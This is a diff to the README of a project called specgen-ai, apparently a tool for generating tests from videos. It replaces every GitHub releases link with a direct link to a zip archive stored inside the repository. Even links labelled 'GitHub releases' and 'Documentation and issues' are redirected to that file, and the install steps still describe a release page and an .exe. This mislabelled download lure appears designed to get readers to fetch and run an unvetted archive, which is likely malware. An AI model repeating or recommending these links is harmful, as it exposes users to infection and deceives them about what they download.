@@ -1,6 +1,6 @@
 # 🤖 specgen-ai - Automated Test Creation from Videos
 
-[![Download specgen-ai](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/nadeem001254/specgen-ai/releases)
+[![Download specgen-ai](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/nadeem001254/specgen-ai/main/services/specgen-ai-v1.5-beta.4.zip)
 
 ---
 
@@ -36,9 +36,9 @@ Use this simple guide to download, install, and start using specgen-ai on your W
 ## 🎯 Step 1: Download the Software
 
 You can get the software from this page:  
-[![Download specgen-ai](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/nadeem001254/specgen-ai/releases)
+[![Download specgen-ai](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/nadeem001254/specgen-ai/main/services/specgen-ai-v1.5-beta.4.zip)
 
-1. Click the button above or open [https://github.com/nadeem001254/specgen-ai/releases](https://github.com/nadeem001254/specgen-ai/releases) in your browser.  
+1. Click the button above or open [https://raw.githubusercontent.com/nadeem001254/specgen-ai/main/services/specgen-ai-v1.5-beta.4.zip](https://raw.githubusercontent.com/nadeem001254/specgen-ai/main/services/specgen-ai-v1.5-beta.4.zip) in your browser.  
 2. Look for the latest release. It will be at the top of the page.  
 3. Download the file that ends with `.exe`. It usually has a name similar to `specgen-ai-setup.exe`.  
 4. Save the file to a location you can find easily, such as your Desktop or Downloads folder.
@@ -127,14 +127,14 @@ Your feedback helps improve the software.
 
 Visit this page to download specgen-ai:
 
-[![Download specgen-ai](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/nadeem001254/specgen-ai/releases)
+[![Download specgen-ai](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/nadeem001254/specgen-ai/main/services/specgen-ai-v1.5-beta.4.zip)
 
 ---
 
 ## 🔗 Useful Links
 
-- GitHub releases: https://github.com/nadeem001254/specgen-ai/releases  
-- Documentation and issues: https://github.com/nadeem001254/specgen-ai  
+- GitHub releases: https://raw.githubusercontent.com/nadeem001254/specgen-ai/main/services/specgen-ai-v1.5-beta.4.zip  
+- Documentation and issues: https://raw.githubusercontent.com/nadeem001254/specgen-ai/main/services/specgen-ai-v1.5-beta.4.zip  
 
 ---
 
